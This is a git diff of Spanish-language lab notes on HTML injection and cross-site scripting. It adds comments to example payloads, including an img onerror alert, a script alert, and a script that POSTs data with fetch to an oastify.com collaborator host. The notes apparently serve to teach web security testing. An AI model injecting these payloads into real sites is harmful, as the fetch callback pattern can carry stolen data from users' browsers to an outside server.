@@ -21,17 +21,17 @@ A continuación, se proporciona el proyecto de GitHub correspondiente al laborat
 ## HTML
 
 ```javascript
-<h1>Hola</h1>                                                /// Podemos hacer inyecciones con codigo HTML
-<marquee>Hola</marquee>                                      /// Podemos usar marquee para que el texto nos salga animado, de izquierda a derecha 
+<h1>Hola</h1>                                                              /// Podemos hacer inyecciones con codigo HTML
+<marquee>Hola</marquee>                                                    /// Podemos usar marquee para que el texto nos salga animado, de izquierda a derecha 
 
-<a href="https://www.ionos.mx/digitalguide/URL">Texto ancla</a>
+<a href="https://www.ionos.mx/digitalguide/URL">Texto ancla</a>            /// Para colocar un enlace 
 
-<img src="images/imagen.png">
+<img src="images/imagen.png">                                              /// Para agregar una imagen
 <img src="https://test.com/images/imagen.png">
 
-<img src="X" onerror=alert(1) />
+<img src="X" onerror=alert(1) />                                                     /// Para colocar un alert basado en un error 
 
-<iframe src="http://ejemplo.org/demo.html" height="400" width="800" name="demo">
+<iframe src="http://ejemplo.org/demo.html" height="400" width="800" name="demo">     /// Para agregar una pagina dentro de otra pagina con dimenciones 
   <p>Su navegador no es compatible con iframes</p>
 </iframe>
 ```
@@ -43,7 +43,7 @@ Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en dond
 ```javascript
 <script>alert("XSS")</script>                                /// Creamos una ventana emergente con codigo javascript que dice XSS
 
-<script>
+<script>                                                     /// Para mandar algo por el metodo POST a un dominio 
   fetch('https://kwklry4t8e18m8q8k5uikgydy44vslga.oastify.com',{method:'POST', mode:'no-cors', body:'omar'});
 </script>
 
